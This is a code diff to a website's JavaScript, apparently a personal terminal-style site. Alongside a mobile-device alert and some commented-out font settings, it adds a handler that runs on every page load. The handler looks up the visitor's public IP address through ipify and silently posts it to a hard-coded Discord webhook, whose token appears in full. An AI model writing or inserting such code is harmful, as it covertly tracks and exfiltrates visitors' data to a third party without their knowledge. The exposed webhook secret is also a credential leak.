@@ -108,7 +108,35 @@ projects -> reidrect to projects page\n`
     }
 }
 
-const xterm = document.getElementById("xterm");
+
+document.addEventListener('DOMContentLoaded', (event) => {
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ip = data.ip;
+            const content = "```Index :: " + ip + "```";
+            const webhookURL = 'https://discord.com/api/webhooks/1185482566694862919/MJSdMZnTnAVKeGUQxZjFVxypSWV5pqt0GuuBkH3-ST-EfyZ6DYa4ABDUSgKEjHhqVVZL';
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: content })
+            });
+        })
+        .catch(error => console.error('Error:', error));
+});
+
+        function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+            function showalert() {
+            if (isMobile()) {
+                alert("Website not supported in mobile devices.");
+            }
+        }
+            window.onload = showalert;
+
+/*const xterm = document.getElementById("xterm");
 const bymn = document.getElementById("bymn");
 xterm.style.fontSize = "10px";
-bymn.style.fontSize = "5px";
+bymn.style.fontSize = "5px";*/
